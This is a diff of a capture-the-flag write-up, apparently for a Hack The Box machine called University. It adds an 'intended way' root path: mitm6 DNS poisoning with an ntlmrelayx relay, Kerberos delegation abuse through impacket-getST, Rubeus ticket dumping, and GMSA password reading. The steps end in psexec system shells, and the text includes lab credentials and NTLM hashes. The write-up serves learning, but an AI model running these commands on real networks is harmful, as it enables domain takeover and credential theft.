@@ -310,7 +310,7 @@ sudo ip route add 192.168.99.0/24 dev ligolo | Adds a route to the target subnet
 <p><code>Martin.T/default password | v3ryS0l!dP@sswd#X</code></p>
 <h2>Password spray</h2>
 <p>Since I have a default password, I'd like to do a password spray to see if anyone else has an unchanged password.</p>
-<p>First, I need a userlist. I'll create one using netexec.</p>
+<p>First, I need an userlist. I'll create one using netexec.</p>
 <p><code>nxc ldap 10.10.11.39 -u martin.t -p 'v3ryS0l!dP@sswd#X' --users</code></p>
 <p><img alt="lists" src="../images/University/lists.png" /></p>
 <p>I'll save it to a userlist, and I'll use awk to grab only the usernames.</p>
@@ -319,7 +319,7 @@ sudo ip route add 192.168.99.0/24 dev ligolo | Adds a route to the target subnet
 <p>I will remove the non-user remains manually. Then I'll spray the default password against it.</p>
 <p><code>nxc ldap 10.10.11.39 -u finaluserlist -p 'v3ryS0l!dP@sswd#X' --continue-on-success</code></p>
 <p><img alt="passwordspra" src="../images/University/passwordspray.png" /></p>
-<p>the <code>(Pwn3d!)</code> message means that the user can remote into the machine.</p>
+<p>The <code>(Pwn3d!)</code> message means that the user can remote into the machine.</p>
 <h2>Discovering the Backup Operators group</h2>
 <p>There are too many users to manually check which ones are valuable. I'll check which groups exist in the domain, and netexec will also show how many members are in each group.</p>
 <p><code>nxc ldap 10.10.11.39 -u martin.t -p 'v3ryS0l!dP@sswd#X' --groups</code></p>
@@ -369,6 +369,93 @@ robocopy Z:\Windows\System32\config C:\programdata SYSTEM /B
 <p><code>evil-winrm -i 10.10.11.39 -u administrator -H 'e63413bab01a0b8820983496c0be3a9a'</code></p>
 <p><img alt="root" src="../images/University/root.png" /></p>
 <p>Rooted!</p>
+<h1>Intended way for root flag</h1>
+<p>After reading the official writeup for the machine, I got to know that my solution for the root part was an unintended way. Of course, I will not be removing my original completion, as I still learned a lot from it and it contains many valuable steps and notes.</p>
+<p>Instead, I will redo the root step as intended, starting with enumerating the 2 non-DC computers.</p>
+<h2>Enumerating the joined machines</h2>
+<p>During my completion, I did not enumerate the attributes of WS-3 because my eyes were set on other goals. After getting onto the box, I found the two automation scripts and immediately pivoted to uploading the malicious lecture, stopping the enumeration there.</p>
+<p>If I continued my standard enumeration process, I would find a clue towards the intended way to solve this box.</p>
+<p><img alt="delegation" src="../images/University/delegation.png" /></p>
+<p>The WS-3 machine has its TrustedForDelegation attribute set to true. This means that it holds kerberos tickets of users who interacted with it/logged into it. With administrative access, these can be collected via mimikatz or rubeus to gain access to those users.</p>
+<p>In the network config of WS-3, I can see that the IPv6 entry for the DNS servers is identical to LAB-2's IPv6 address.</p>
+<p>WS-3:</p>
+<p><img alt="ipv61" src="../images/University/ipv61.png" /></p>
+<p>LAB-2:</p>
+<p><img alt="ipv62" src="../images/University/ipv62.png" /></p>
+<p>Additionally, I can see that while the IPv4 address is static<code>(DHCP enabled: no + static IP set)</code>, the IPv6 is dynamic<code>(Autoconfiguration enabled: Yes)</code>. Since the WS-3 machine will use the LAB-2 machine as its DNS server for IPv6 DNS lookups, I'll be able to poison it and potentially execute an NTLM relay attack if the machine tries to authenticate to LAB-2.</p>
+<h2>Investigating the WPAD automation script</h2>
+<p>When taking a look at the automated scripts, during my initial completion, I just saw an opportunity to get an elevated shell via swapping the wpad cache cleaner script. I did not think too much of what it was used for, but it plays a big role in the machine's intended solution.</p>
+<p>WPAD (Web Proxy Auto-Discovery) is used by clients to locate the URL of configuration files via DHCP or DNS discovery. I looked for more information about WPAD on Wikipedia.</p>
+<p><code>https://en.wikipedia.org/wiki/Web_Proxy_Auto-Discovery_Protocol</code></p>
+<p><img alt="wikipedia" src="../images/University/wikipedia.png" /></p>
+<p>The mention of DNS/DHCP and how it works with WPAD covers the network configuration of WS-3. Since there is a cleaner script running automatically, it's safe to assume that the WS-3 machine <em>is</em> using WPAD.</p>
+<p>Since DHCPv4 is disabled on WS-3 and DHCPv6 does not have a WPAD option defined, it will default to DNS, for which the LAB-2 machine will be preferred first.</p>
+<p>If I can add a WPAD record pointing to LAB-2, I'll be able to hijack the query and perform an NTLM relay attack to act as the WS-3 machine account.</p>
+<h2>NTLM relay attack against WS-3</h2>
+<p>I will need 2 tools for this attack. Mitm6 to poison the DNS, and ntlmrelayx to relay the credentials of WS-3 to the DC.</p>
+<p>Before that, though, I need to create a new computer account. Computer accounts have an SPN set by default, so it'll be easier to request service tickets once I'm done with the relaying.</p>
+<p><code>impacket-addcomputer -computer-name hexicon -computer-pass hexicon -dc-host DC.university.htb -dc-ip 10.10.11.39 university.htb/wao:WebAO1337</code></p>
+<p><img alt="computer" src="../images/University/computer.png" /></p>
+<p>I downloaded and transferred mitm6 onto the LAB-2 machine using scp.</p>
+<p><code>https://github.com/dirkjanm/mitm6</code></p>
+<p><code>scp -r mitm6 wao@192.168.99.12:/home/wao/</code></p>
+<p>Now that I have both of the tools, I can perform the attack.</p>
+<p>First, I'll run ntlmrelayx.py on LAB-2. It needs root privileges, so I'll use <code>sudo su</code> to get a root shell before doing that.</p>
+<p><code>ntlmrelayx.py -ts -t ldap://192.168.99.1 -wh test -6 --no-da --escalate-user hexicon$ --delegate-access</code></p>
+<p><img alt="ntlmrelayx" src="../images/University/ntlmrelayx.png" /></p>
+<p>On a different LAB-2 shell, I'll run mitm6.</p>
+<p><code>python3 mitm6/mitm6.py -d university.htb -i eth0</code></p>
+<p><img alt="mitm6" src="../images/University/mitm6.png" /></p>
+<p>After waiting for approximately 14 minutes, WS-3 makes an attempt to reach <code>wpad.university.htb</code>, which is caught and spoofed by mitm6.</p>
+<p><img alt="spoog" src="../images/University/spoof.png" /></p>
+<p>And then hijacked by ntlmrelayx.</p>
+<p><img alt="ntlmrelayed" src="../images/University/ntlmrelayed.png" /></p>
+<p>If there were no automated scripts, I still could make the WS-3 machine authenticate back to the LAB-2 machine.</p>
+<p><code>https://www.guidepointsecurity.com/blog/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/</code></p>
+<p>This article contains a lot of useful information about delegation attacks.</p>
+<h2>Getting a system shell on WS-3</h2>
+<p>My malicious computer account, hexicon$, is now able to request service tickets on behalf of other users. I will request a ticket for CIFS on WS-3 as administrator, which will allow me administrative access to the machine.</p>
+<p><code>impacket-getST -spn cifs/WS-3.university.htb -impersonate administrator -dc-ip 10.10.11.39 university.htb/'hexicon$':hexicon</code></p>
+<p><img alt="ccache" src="../images/University/ccache.png" /></p>
+<p>To quickly create a config file for kerberos, I used this guide.</p>
+<p><code>https://notes.benheater.com/books/active-directory/page/kerberos-authentication-from-kali</code></p>
+<p>With an administrator CIFS service ticket, I can use impacket's psexec to get a system shell on the box, as the dropped file will be executed via a system service.</p>
+<p><code>impacket-psexec -k -no-pass -dc-ip 10.10.11.39 -target-ip 192.168.99.2 university.htb/administrator@WS-3.university.htb</code></p>
+<p><img alt="systemshell" src="../images/University/systemshell.png" /></p>
+<h2>Dumping cached kerberos tickets with Rubeus</h2>
+<p>I uploaded Rubeus onto the box using an evil-winrm session as wao. I will use it to dump any cached kerberos tickets.</p>
+<p><code>.\Rubeus.exe dump /nowrap</code></p>
+<p>There were tickets for Martin.T, administrator, and the WS-3 machine account, which didn't interest me at this point.</p>
+<p>However, after a while, I saw a different ticket moving past my screen.</p>
+<p><img alt="rosel" src="../images/University/rosel.png" /></p>
+<p>This is a TGT of Rose.L, an user I've not seen before. I'll take this base64-encoded ticket and I'll copy it onto my box.</p>
+<p><img alt="ticket" src="../images/University/ticket.png" /></p>
+<p>Before using this ticket, I need to convert it into a .ccache file so that it'll be compatible with my usual tools.</p>
+<p><code>impacket-ticketConverter roseltgt.kirbi rosel.ccache</code></p>
+<p><img alt="convert" src="../images/University/convert.png" /></p>
+<p>After exporting the .ccache ticket, I will try to remote into the DC as Rose.L.</p>
+<p><img alt="groupsrosa" src="../images/University/groupsrosa.png" /></p>
+<h2>Reading the GMSA password of GMSA-PClient01</h2>
+<p><img alt="bloodhound" src="../images/University/bloodhound.png" /></p>
+<p>Looking at the bloodhound output, the helpdesk group can read the GMSA password of GMSA-PClient01, which is then allowed to act as the DC, essentially allowing me to impersonate anyone on the domain controller.</p>
+<p>Because LDAPS is not configured/unavailable, I will have to read it from within the DC itself. I downloaded GMSAPasswordReader.exe from the SharpCollection.</p>
+<p><code>https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.7_Any</code></p>
+<p>After uploading the tool via evil-winrm, I ran it against the GMSA account.</p>
+<p><code>.\GMSAPasswordReader.exe --accountname 'GMSA-PClient01$'</code></p>
+<p><img alt="gmsa" src="../images/University/gmsa.png" /></p>
+<p><code>GMSA-PClient01$ | 6D364C74FF11B3BCE0BC41C097BF55C8</code></p>
+<h2>Getting a system shell on the DC</h2>
+<p>The GMSA account can act as the DC, meaning I can impersonate any domain user on the domain controller.</p>
+<p>First, I need a ticket for the GMSA-Pclient01 account.</p>
+<p><code>impacket-getTGT -hashes ':6D364C74FF11B3BCE0BC41C097BF55C8' -no-pass -dc-ip 10.10.11.39 university.htb/'GMSA-PClient01$'</code></p>
+<p><img alt="ticketgmsa" src="../images/University/ticketgmsa.png" /></p>
+<p>With this ticket, I can request a service ticket for administrator just like in the earlier steps.</p>
+<p><code>impacket-getST -spn CIFS/DC.university.htb -hashes ':6D364C74FF11B3BCE0BC41C097BF55C8' -no-pass -impersonate administrator -dc-ip 10.10.11.39 university.htb/'GMSA-PClient01$'</code></p>
+<p><img alt="adminticket" src="../images/University/adminticket.png" /></p>
+<p>Finally, I can use psexec to get a system shell on the domain controller.</p>
+<p><code>impacket-psexec -k -no-pass -dc-ip 10.10.11.39 -target-ip 10.10.11.39 university.htb/administrator@DC.university.htb</code></p>
+<p><img alt="systemshellfinal" src="../images/University/systemshellfinal.png" /></p>
+<p>Rooted! (The intended way)</p>
             </div>
             
             <div class="toc-sidebar">
